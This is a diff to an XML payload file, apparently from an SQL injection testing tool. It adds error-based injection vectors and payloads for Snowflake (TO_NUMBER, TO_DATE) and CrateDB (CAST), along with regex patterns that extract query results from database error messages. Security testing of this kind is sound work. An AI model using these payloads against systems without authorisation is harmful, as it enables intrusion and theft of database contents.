@@ -911,6 +911,103 @@
         </details>
     </test>
 
+    <!-- Snowflake error-based payloads -->
+    <test>
+        <title>Snowflake AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (TO_NUMBER)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND TO_NUMBER('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND TO_NUMBER('[DELIMITER_START]'||(SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Snowflake</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Snowflake OR error-based - WHERE or HAVING clause (TO_NUMBER)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>OR TO_NUMBER('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR TO_NUMBER('[DELIMITER_START]'||(SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Snowflake</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Snowflake AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (TO_DATE)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND TO_DATE('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND TO_DATE('[DELIMITER_START]'||(SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Snowflake</dbms>
+        </details>
+    </test>
+
+    <!-- CrateDB error-based payloads -->
+    <test>
+        <title>CrateDB AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (CAST)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND CAST(('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]') AS INTEGER)</vector>
+        <request>
+            <payload>AND CAST(('[DELIMITER_START]'||(SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]') AS INTEGER)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>CrateDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>CrateDB OR error-based - WHERE or HAVING clause (CAST)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>OR CAST(('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]') AS INTEGER)</vector>
+        <request>
+            <payload>OR CAST(('[DELIMITER_START]'||(SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]') AS INTEGER)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>CrateDB</dbms>
+        </details>
+    </test>
+
     <!--
          TODO: if possible, add payload for SQLite, Microsoft Access,
          and SAP MaxDB - no known techniques at this time
@@ -1507,6 +1604,46 @@
             <dbms>IBM DB2</dbms>
         </details>
     </test>
+    <!-- Snowflake error-based - ORDER BY, GROUP BY clause -->
+    <test>
+        <title>Snowflake error-based - ORDER BY, GROUP BY clause (TO_NUMBER)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,(SELECT TO_NUMBER('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>,(SELECT TO_NUMBER('[DELIMITER_START]'||(SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Snowflake</dbms>
+        </details>
+    </test>
+
+    <!-- CrateDB error-based - ORDER BY, GROUP BY clause -->
+    <test>
+        <title>CrateDB error-based - ORDER BY, GROUP BY clause (CAST)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,(SELECT CAST(('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]') AS INTEGER))</vector>
+        <request>
+            <payload>,(SELECT CAST(('[DELIMITER_START]'||(SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]') AS INTEGER))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>CrateDB</dbms>
+        </details>
+    </test>
+
     <!--
          TODO: if possible, add payload for SQLite, Microsoft Access
          and SAP MaxDB - no known techniques at this time
